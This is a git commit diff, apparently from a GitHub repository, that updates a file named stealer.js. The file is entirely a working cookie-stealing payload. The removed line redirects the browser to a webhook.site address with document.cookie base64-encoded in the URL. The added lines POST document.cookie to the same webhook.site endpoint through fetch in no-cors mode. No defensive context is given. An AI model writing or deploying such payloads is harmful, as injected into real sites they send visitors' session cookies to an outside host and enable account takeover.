c17aefb985264eba81c6ef47fc005c0d99f56997
mr7s3d0 <84435418+mr7s3d0@users.noreply.github.com>
2025-06-09 22:50:34 +0700

    Update stealer.js

--- stealer.js
+++ stealer.js
@@ -1,1 +1,5 @@
-document.location='https://webhook.site/9381818e-cd98-4636-a7d4-a8f79c839b55/?cookiestealer='+encodeURIComponent(btoa(document.cookie));
+fetch('https://webhook.site/9381818e-cd98-4636-a7d4-a8f79c839b55', {
+  method: 'POST',
+  mode: 'no-cors',
+  body:'PeanutButterCookies='+document.cookie
+  }); 
